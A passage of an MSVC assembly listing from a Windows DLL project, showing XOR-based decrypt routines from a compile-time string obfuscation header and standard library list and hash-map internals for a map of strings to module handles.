?data@?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<24,-1071364949277595293,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<24,-1071364949277595293,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<31,-7365158476837733999,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+31], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	lea	rdx, QWORD PTR [rcx+4]
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r9, -2
	movdqa	xmm4, XMMWORD PTR __xmm@99c9b36339a1399199c9b36339a13991
	sub	r9, rcx
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	mov	r10d, 2
	sub	r10, rcx
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, WORD PTR [rdx-4]
	movq	xmm0, rax
	punpcklqdq xmm0, xmm0
	add	rax, 8
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-4], cx
	lea	rcx, QWORD PTR [r9+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-2], cx
	mov	rcx, rdx
	sub	rcx, r8
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx], cx
	lea	rcx, QWORD PTR [r10+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx+2], cx
	add	rdx, 8
	cmp	rax, 24
	jb	$LL7@decrypt

; 68   : 		for ( size_type i = 0; i < size; i++ )

	cmp	rax, 31
	jae	SHORT $LN6@decrypt
$LN25@decrypt:
	mov	r9, -7365158476837733999		; 99c9b36339a13991H
	npad	7
$LL24@decrypt:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 31
	jb	SHORT $LL24@decrypt
$LN6@decrypt:

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+31], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<31,-7365158476837733999,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<31,-7365158476837733999,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<31,-7365158476837733999,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<15,2868625218150416285,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+15], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN26@decrypt

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@27cf676ff1953f9d27cf676ff1953f9d
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN26@decrypt:
	mov	r9, 2868625218150416285			; 27cf676ff1953f9dH
$LL25@decrypt:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 15
	jb	SHORT $LL25@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+15], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<15,2868625218150416285,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<15,2868625218150416285,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<15,2868625218150416285,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<16,-1909597575049685103,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+16], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	mov	r9, -2
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r10d, 2
	movdqa	xmm4, XMMWORD PTR __xmm@e57fbf1f7b375791e57fbf1f7b375791
	sub	r9, r8
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	sub	r10, r8
	add	rcx, 4
	mov	rdx, -4
	sub	rdx, r8
	npad	3
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	lea	rax, QWORD PTR [rdx+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx-4]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx-4], ax
	lea	rax, QWORD PTR [r9+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx-2], ax
	mov	rax, rcx
	sub	rax, r8
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx], ax
	lea	rax, QWORD PTR [r10+rcx]
	movq	xmm0, rax
	movzx	eax, WORD PTR [rcx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, eax
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+2], ax
	add	rcx, 8
	lea	rax, QWORD PTR [rdx+rcx]
	cmp	rax, 16
	jb	$LL7@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+16], 0

; 151  : 			}
; 152  : 		}

	ret	0
$LN25@decrypt:
	mov	r9, -1909597575049685103		; e57fbf1f7b375791H
	npad	6
$LL24@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 16
	jb	SHORT $LL24@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+16], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<16,-1909597575049685103,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<16,-1909597575049685103,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<16,-1909597575049685103,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<25,8178357769676364775,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+25], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN25@decrypt
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000000010000000000000000
	lea	rdx, QWORD PTR [rcx+4]
	movdqa	xmm3, XMMWORD PTR __xmm@00000000000000070000000000000007
	mov	r9, -2
	movdqa	xmm4, XMMWORD PTR __xmm@717f5d0f8b9d9be7717f5d0f8b9d9be7
	sub	r9, rcx
	movdqa	xmm5, XMMWORD PTR __xmm@00000000000008000000000000000800
	mov	r10d, 2
	sub	r10, rcx
$LL7@decrypt:

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, WORD PTR [rdx-4]
	movq	xmm0, rax
	punpcklqdq xmm0, xmm0
	add	rax, 8
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-4], cx
	lea	rcx, QWORD PTR [r9+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx-2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx-2], cx
	mov	rcx, rdx
	sub	rcx, r8
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx], cx
	lea	rcx, QWORD PTR [r10+rdx]
	movq	xmm0, rcx
	movzx	ecx, WORD PTR [rdx+2]
	punpcklqdq xmm0, xmm0
	paddq	xmm0, xmm2
	andps	xmm0, xmm3
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm4, xmm0
	movd	xmm0, ecx
	pshufb	xmm1, xmm5
	xorps	xmm1, xmm0
	movd	ecx, xmm1
	mov	WORD PTR [rdx+2], cx
	add	rdx, 8
	cmp	rax, 24
	jb	$LL7@decrypt

; 68   : 		for ( size_type i = 0; i < size; i++ )

	cmp	rax, 25
	jae	SHORT $LN6@decrypt
$LN25@decrypt:
	mov	r9, 8178357769676364775			; 717f5d0f8b9d9be7H
	npad	7
$LL24@decrypt:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 25
	jb	SHORT $LL24@decrypt
$LN6@decrypt:

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+25], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<25,8178357769676364775,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<25,8178357769676364775,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<25,8178357769676364775,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?decrypt@?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAXXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAXXZ PROC ; ay::obfuscated_data<12,-1449805614855655457,char>::decrypt, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+12], 0
	mov	r8, rcx
	je	$LN2@decrypt

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN26@decrypt

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@ebe1417985296fdfebe1417985296fdf
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN26@decrypt:
	mov	r9, -1449805614855655457		; ebe1417985296fdfH
$LL25@decrypt:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 12
	jb	SHORT $LL25@decrypt

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+12], 0
$LN2@decrypt:

; 151  : 			}
; 152  : 		}

	ret	0
?decrypt@?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEAAXXZ ENDP ; ay::obfuscated_data<12,-1449805614855655457,char>::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ?data@?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?data@?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEBAPEBDXZ PROC ; ay::obfuscator<12,-1449805614855655457,char>::data, COMDAT

; 95   : 			return &m_data[0];

	mov	rax, rcx

; 96   : 		}

	ret	0
?data@?$obfuscator@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@QEBAPEBDXZ ENDP ; ay::obfuscator<12,-1449805614855655457,char>::data
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??D?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ
_TEXT	SEGMENT
this$ = 8
??D?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ PROC ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*, COMDAT

; 150  :         return this->_Ptr->_Myval;

	mov	rax, QWORD PTR [rcx]
	add	rax, 16

; 238  :         return const_cast<reference>(_Mybase::operator*());
; 239  :     }

	ret	0
??D?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ENDP ; std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??E?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ
_TEXT	SEGMENT
this$ = 8
??E?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ PROC ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator++, COMDAT

; 50   :         _Ptr = _Ptr->_Next;

	mov	rax, QWORD PTR [rcx]
	mov	rdx, QWORD PTR [rax]

; 51   :         return *this;

	mov	rax, rcx
	mov	QWORD PTR [rcx], rdx

; 52   :     }

	ret	0
??E?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ ENDP ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator++
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??D?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ
_TEXT	SEGMENT
this$ = 8
??D?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ PROC ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator*, COMDAT

; 42   :         return _Ptr->_Myval;

	mov	rax, QWORD PTR [rcx]
	add	rax, 16

; 43   :     }

	ret	0
??D?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEBAAEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ENDP ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator*
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ PROC ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Tidy, COMDAT

; 308  :     void _Tidy() noexcept {

$LN34:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 309  :         if (_Mypair._Myval2._Myfirst != nullptr) {

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN2@Tidy

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

